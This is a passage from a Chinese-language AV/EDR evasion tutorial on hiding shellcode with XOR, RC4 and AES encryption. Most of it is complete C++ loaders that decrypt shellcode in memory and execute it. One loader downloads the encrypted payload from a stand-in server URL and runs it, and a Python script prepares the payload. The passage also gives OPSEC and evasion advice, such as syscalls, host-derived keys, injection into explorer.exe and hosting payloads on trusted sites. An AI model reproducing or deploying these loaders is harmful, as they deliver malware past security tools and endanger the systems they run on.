class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-comment">// 省略部分以节省篇幅</span><br>    &#125;;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key = <span class="hljs-number">0xAA</span>; <span class="hljs-comment">// 简单的XOR密钥</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Encrypted Shellcode:\n&quot;</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> encrypted_byte = shellcode[i] ^ key;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%02x, &quot;</span>, encrypted_byte);<br>    &#125;<br><br>    std::cout &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>输出将是一个加密的缓冲区，可以嵌入到加载器中。</p>
<hr>
<h3 id="5-1-4-XOR解密与内存中执行"><a href="#5-1-4-XOR解密与内存中执行" class="headerlink" title="5.1.4 XOR解密与内存中执行"></a><strong>5.1.4 XOR解密与内存中执行</strong></h3><p>这是一个完整的C++加载器，它在内存中解密XOR加密的shellcode并执行它：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">// 示例：XOR加密的shellcode（原始shellcode与0xAA进行XOR）</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> encrypted_shellcode[] = &#123;<br>    <span class="hljs-number">0x56</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xaa</span><br>    <span class="hljs-comment">// 省略部分以节省篇幅</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    SIZE_T size = <span class="hljs-built_in">sizeof</span>(encrypted_shellcode);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> xor_key = <span class="hljs-number">0xAA</span>;<br><br>    <span class="hljs-comment">// 分配RWX内存（可根据OPSEC调整）</span><br>    LPVOID exec_mem = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">nullptr</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>    <span class="hljs-keyword">if</span> (!exec_mem) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Memory allocation failed\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 将XOR加密的shellcode解密到内存中</span><br>    <span class="hljs-keyword">for</span> (SIZE_T i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)exec_mem)[i] = encrypted_shellcode[i] ^ xor_key;<br>    &#125;<br><br>    <span class="hljs-comment">// 更改内存保护为RX</span><br>    DWORD old_protect;<br>    <span class="hljs-built_in">VirtualProtect</span>(exec_mem, size, PAGE_EXECUTE_READ, &amp;old_protect);<br><br>    <span class="hljs-comment">// 执行shellcode</span><br>    ((<span class="hljs-built_in">void</span>(*)())exec_mem)();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="5-1-5-真实世界示例"><a href="#5-1-5-真实世界示例" class="headerlink" title="5.1.5 真实世界示例"></a><strong>5.1.5 真实世界示例</strong></h3><p>恶意加载器通常会：</p>
<ul>
<li><p>混淆密钥本身（使用多字节XOR或动态推导）</p>
</li>
<li><p>将有效负载存储在图像段中（例如，<code>.data</code>或<code>.rsrc</code>）</p>
</li>
<li><p>避免使用<code>VirtualAlloc</code>，而使用<code>Nt*</code> API以增加隐蔽性</p>
</li>
</ul>
<p>恶意软件中的示例：</p>
<ul>
<li><p>Emotet加载器使用XOR+Base64</p>
</li>
<li><p>APT组织使用XOR加密shellcode，并将其嵌入注册表键或文件间隙空间中</p>
</li>
</ul>
<hr>
<h3 id="5-1-6-检测对策"><a href="#5-1-6-检测对策" class="headerlink" title="5.1.6 检测对策"></a><strong>5.1.6 检测对策</strong></h3><p>防御者可能会：</p>
<ul>
<li><p>使用熵检查（加密的有效负载&#x3D;高熵）</p>
</li>
<li><p>启动时分析内存变化</p>
</li>
<li><p>标记已知的XOR模式</p>
</li>
</ul>
<p>为规避这些检测：</p>
<ul>
<li><p>使用多阶段XOR</p>
</li>
<li><p>使用动态密钥（从时间、主机名等推导）</p>
</li>
<li><p>执行时即时解密（JIT）</p>
</li>
</ul>
<h2 id="AV-EDR规避实用技术-5-2-使用RC4加密进行有效负载混淆"><a href="#AV-EDR规避实用技术-5-2-使用RC4加密进行有效负载混淆" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 5.2 - 使用RC4加密进行有效负载混淆"></a>AV&#x2F;EDR规避实用技术 - 5.2 - 使用RC4加密进行有效负载混淆</h2><h3 id="5-2-1-RC4简介"><a href="#5-2-1-RC4简介" class="headerlink" title="5.2.1 RC4简介"></a><strong>5.2.1 RC4简介</strong></h3><p>RC4是一种流密码，通过与密钥生成的<strong>伪随机字节流</strong>进行XOR操作加密数据。虽然今天它被认为对加密目的不再安全，但由于以下原因，它仍然在<strong>混淆</strong>和<strong>反AV规避</strong>中有用：</p>
<ul>
<li><p>生成高熵输出（难以进行模式匹配）</p>
</li>
<li><p>支持任意长度的密钥</p>
</li>
<li><p>快速且轻量级</p>
</li>
</ul>
<hr>
<h3 id="5-2-2-在恶意软件和红队中的实际应用"><a href="#5-2-2-在恶意软件和红队中的实际应用" class="headerlink" title="5.2.2 在恶意软件和红队中的实际应用"></a><strong>5.2.2 在恶意软件和红队中的实际应用</strong></h3><p>RC4被广泛用于：</p>
<ul>
<li><p><strong>Cobalt Strike</strong> 的早期变种中，用于beacon的阶段化</p>
</li>
<li><p><strong>PlugX</strong> 和 <strong>Lokibot</strong> 的有效负载加密</p>
</li>
<li><p>将有效负载嵌入文档或图像中（例如：宏 → RC4解密 → shellcode）</p>
</li>
</ul>
<hr>
<h3 id="5-2-3-在C-中的RC4实现"><a href="#5-2-3-在C-中的RC4实现" class="headerlink" title="5.2.3 在C++中的RC4实现"></a><strong>5.2.3 在C++中的RC4实现</strong></h3><p>让我们通过一个完整的RC4加载器来演示如何在运行时解密shellcode。</p>
<h4 id="RC4函数实现"><a href="#RC4函数实现" class="headerlink" title="RC4函数实现"></a><strong>RC4函数实现</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-comment">// RC4密钥调度和PRGA</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_encrypt_decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* data, <span class="hljs-type">size_t</span> data_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* key, <span class="hljs-type">size_t</span> key_len)</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> S[<span class="hljs-number">256</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) S[i] = i;<br><br>    <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// KSA - 密钥调度算法</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>        j = (j + S[i] + key[i % key_len]) % <span class="hljs-number">256</span>;<br>        std::<span class="hljs-built_in">swap</span>(S[i], S[j]);<br>    &#125;<br><br>    <span class="hljs-comment">// PRGA - 伪随机生成算法</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> k = <span class="hljs-number">0</span>; k &lt; data_len; k++) &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + S[i]) % <span class="hljs-number">256</span>;<br>        std::<span class="hljs-built_in">swap</span>(S[i], S[j]);<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> rnd = S[(S[i] + S[j]) % <span class="hljs-number">256</span>];<br>        data[k] ^= rnd;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="5-2-4-加密有效负载与加载器执行"><a href="#5-2-4-加密有效负载与加载器执行" class="headerlink" title="5.2.4 加密有效负载与加载器执行"></a><strong>5.2.4 加密有效负载与加载器执行</strong></h3><p>假设你已经离线使用RC4加密了你的shellcode，嵌入到加载器中：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 加密的shellcode（RC4加密后）</span><br><span class="hljs-comment">// 该数据应在离线时使用rc4_encrypt_decrypt函数生成</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> encrypted_shellcode[] = &#123;<br>    <span class="hljs-number">0x91</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA2</span><br>    <span class="hljs-comment">// 省略部分示例</span><br>&#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> rc4_key[] = <span class="hljs-string">&quot;SecretKey123&quot;</span>; <span class="hljs-comment">// 简单的RC4密钥</span><br></code></pre></td></tr></table></figure>

<p>然后解密并执行：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    SIZE_T size = <span class="hljs-built_in">sizeof</span>(encrypted_shellcode);<br>    <br>    <span class="hljs-comment">// 为shellcode分配内存</span><br>    LPVOID exec_mem = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>    <span class="hljs-keyword">if</span> (!exec_mem) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to allocate memory\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 将加密的shellcode复制到分配的内存中</span><br>    <span class="hljs-built_in">memcpy</span>(exec_mem, encrypted_shellcode, size);<br><br>    <span class="hljs-comment">// 在内存中解密shellcode</span><br>    <span class="hljs-built_in">rc4_encrypt_decrypt</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)exec_mem, size, rc4_key, <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span>*)rc4_key));<br><br>    <span class="hljs-comment">// 更改内存保护为可执行</span><br>    DWORD oldProtect;<br>    <span class="hljs-built_in">VirtualProtect</span>(exec_mem, size, PAGE_EXECUTE_READ, &amp;oldProtect);<br><br>    <span class="hljs-comment">// 调用shellcode</span><br>    ((<span class="hljs-built_in">void</span>(*)())exec_mem)();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="5-2-5-OPSEC考虑"><a href="#5-2-5-OPSEC考虑" class="headerlink" title="5.2.5 OPSEC考虑"></a><strong>5.2.5 OPSEC考虑</strong></h3><p>为了增加隐蔽性：</p>
<ul>
<li><p>将RC4密钥存储为<strong>混淆形式</strong></p>
</li>
<li><p>动态推导密钥，基于<strong>主机属性</strong></p>
</li>
<li><p>避免使用<code>VirtualAlloc</code>；改用<code>NtAllocateVirtualMemory</code>（系统调用）</p>
</li>
<li><p>避免使用<code>memcpy</code>；改用<code>RtlCopyMemory</code></p>
</li>
</ul>
<hr>
<h3 id="5-2-6-检测规避技巧"><a href="#5-2-6-检测规避技巧" class="headerlink" title="5.2.6 检测规避技巧"></a><strong>5.2.6 检测规避技巧</strong></h3><p>AV可能会标记：</p>
<ul>
<li><p>高熵的内存区域</p>
</li>
<li><p>已知的RC4密钥调度逻辑</p>
</li>
<li><p>使用<code>VirtualAlloc</code>和<code>VirtualProtect</code></p>
</li>
</ul>
<p><strong>规避策略：</strong></p>
<ul>
<li><p>将RC4隐藏在自定义的混淆器中</p>
</li>
<li><p>将有效负载分阶段存储在环境变量或注册表中</p>
</li>
<li><p>延迟执行，注入到远程进程中</p>
</li>
</ul>
<hr>
<h3 id="5-2-7-真实世界用例"><a href="#5-2-7-真实世界用例" class="headerlink" title="5.2.7 真实世界用例"></a><strong>5.2.7 真实世界用例</strong></h3><p><strong>示例</strong>：渗透测试人员创建一个Word宏，执行以下操作：</p>
<ol>
<li><p>从GitHub URL下载RC4加密的shellcode</p>
</li>
<li><p>使用RC4密钥”MalTestKey”解密</p>
</li>
<li><p>在explorer.exe中分配内存并注入</p>
</li>
</ol>
<p>这可以绕过EDR，除非启用了内存扫描或基于行为的启发式检测。</p>
<hr>
<h3 id="5-2-8-远程RC4有效负载获取与执行"><a href="#5-2-8-远程RC4有效负载获取与执行" class="headerlink" title="5.2.8 远程RC4有效负载获取与执行"></a><strong>5.2.8 远程RC4有效负载获取与执行</strong></h3><p>一个实际的用例是将RC4加密的shellcode存储在远程服务器上，并在运行时动态下载和解密它。此方法通过：</p>
<ul>
<li><p>保持有效负载不写入磁盘</p>
</li>
<li><p>延迟检测</p>
</li>
<li><p>允许服务器端的有效负载轮换</p>
</li>
</ul>
<h4 id="远程RC4加载器示例"><a href="#远程RC4加载器示例" class="headerlink" title="远程RC4加载器示例"></a><strong>远程RC4加载器示例</strong></h4><p>这个加载器：</p>
<ol>
<li><p>从给定的URL下载RC4加密的shellcode</p>
</li>
<li><p>在内存中解密它</p>
</li>
<li><p>执行解密后的有效负载</p>
</li>
</ol>
<h4 id="依赖项"><a href="#依赖项" class="headerlink" title="依赖项"></a><strong>依赖项</strong></h4><p>我们将使用Windows API (<code>URLDownloadToCacheFile</code> 或 <code>WinINet</code>)，以避免使用像libcurl这样的外部库。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wininet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;wininet.lib&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* data, <span class="hljs-type">size_t</span> data_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* key, <span class="hljs-type">size_t</span> key_len)</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> S[<span class="hljs-number">256</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) S[i] = i;<br><br>    <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>        j = (j + S[i] + key[i % key_len]) % <span class="hljs-number">256</span>;<br>        std::<span class="hljs-built_in">swap</span>(S[i], S[j]);<br>    &#125;<br><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> k = <span class="hljs-number">0</span>; k &lt; data_len; k++) &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + S[i]) % <span class="hljs-number">256</span>;<br>        std::<span class="hljs-built_in">swap</span>(S[i], S[j]);<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> rnd = S[(S[i] + S[j]) % <span class="hljs-number">256</span>];<br>        data[k] ^= rnd;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">DownloadShellcode</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* url, std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt;&amp; data)</span> </span>&#123;<br>    HINTERNET hInternet = <span class="hljs-built_in">InternetOpenA</span>(<span class="hljs-string">&quot;Mozilla&quot;</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!hInternet) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    HINTERNET hFile = <span class="hljs-built_in">InternetOpenUrlA</span>(hInternet, url, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, INTERNET_FLAG_RELOAD, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!hFile) &#123;<br>        <span class="hljs-built_in">InternetCloseHandle</span>(hInternet);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">4096</span>];<br>    DWORD bytesRead = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">InternetReadFile</span>(hFile, buffer, <span class="hljs-built_in">sizeof</span>(buffer), &amp;bytesRead) &amp;&amp; bytesRead != <span class="hljs-number">0</span>) &#123;<br>        data.<span class="hljs-built_in">insert</span>(data.<span class="hljs-built_in">end</span>(), buffer, buffer + bytesRead);<br>    &#125;<br><br>    <span class="hljs-built_in">InternetCloseHandle</span>(hFile);<br>    <span class="hljs-built_in">InternetCloseHandle</span>(hInternet);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="执行逻辑"><a href="#执行逻辑" class="headerlink" title="执行逻辑"></a><strong>执行逻辑</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* shellcode_url = <span class="hljs-string">&quot;http://yourserver.com/payload.rc4&quot;</span>;  <span class="hljs-comment">// 替换为实际URL</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;MalKey&quot;</span>;<br><br>    std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; encryptedShellcode;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">DownloadShellcode</span>(shellcode_url, encryptedShellcode)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Download failed.\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 解密shellcode</span><br>    <span class="hljs-built_in">rc4</span>(encryptedShellcode.<span class="hljs-built_in">data</span>(), encryptedShellcode.<span class="hljs-built_in">size</span>(), key, <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span>*)key));<br><br>    <span class="hljs-comment">// 分配内存并执行</span><br>    LPVOID exec = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, encryptedShellcode.<span class="hljs-built_in">size</span>(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-keyword">if</span> (!exec) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Memory allocation failed.\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(exec, encryptedShellcode.<span class="hljs-built_in">data</span>(), encryptedShellcode.<span class="hljs-built_in">size</span>());<br><br>    <span class="hljs-comment">// 执行解密后的shellcode</span><br>    ((<span class="hljs-built_in">void</span>(*)())exec)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="如何生成加密的有效负载"><a href="#如何生成加密的有效负载" class="headerlink" title="如何生成加密的有效负载"></a><strong>如何生成加密的有效负载</strong></h4><p>你可以使用相同的RC4算法在离线时加密</p>
<p>你的有效负载：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># rc4_encrypt.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_encrypt</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    result = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        result.append(byte ^ K)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><span class="hljs-comment"># 示例使用</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;shellcode.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br>enc = rc4_encrypt(data, <span class="hljs-string">b&quot;MalKey&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.rc4&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(enc)<br></code></pre></td></tr></table></figure>

<p>将 <code>payload.rc4</code> 上传到你的Web服务器（如Apache、Nginx或GitHub raw URL）。</p>
<p>LOTS: <a target="_blank" rel="noopener" href="https://lots-project.com/">https://lots-project.com/</a></p>
<hr>
<h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a><strong>优势</strong></h4><ul>
<li><p>有效负载在运行时之前始终保持加密</p>
</li>
<li><p>二进制中没有可疑的字符串或shellcode</p>
</li>
<li><p>有效负载可以在不重新构建加载器的情况下动态更新</p>
</li>
</ul>
<h2 id="AV-EDR规避实用技术-5-3-使用AES加密进行有效负载加密与执行"><a href="#AV-EDR规避实用技术-5-3-使用AES加密进行有效负载加密与执行" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 5.3 - 使用AES加密进行有效负载加密与执行"></a>AV&#x2F;EDR规避实用技术 - 5.3 - 使用AES加密进行有效负载加密与执行</h2><p>AES（高级加密标准）是一种广泛使用的对称块加密算法，用于保护数据。在进攻操作中，AES加密：</p>
<ul>
<li><p>隐藏原始的shellcode，避免静态和内存扫描工具的检测。</p>
</li>
<li><p>需要在加载器中实现解密过程。</p>
</li>
<li><p>被真实世界的恶意软件（如Cobalt Strike、TrickBot和Emotet）广泛使用。</p>
</li>
</ul>
<hr>
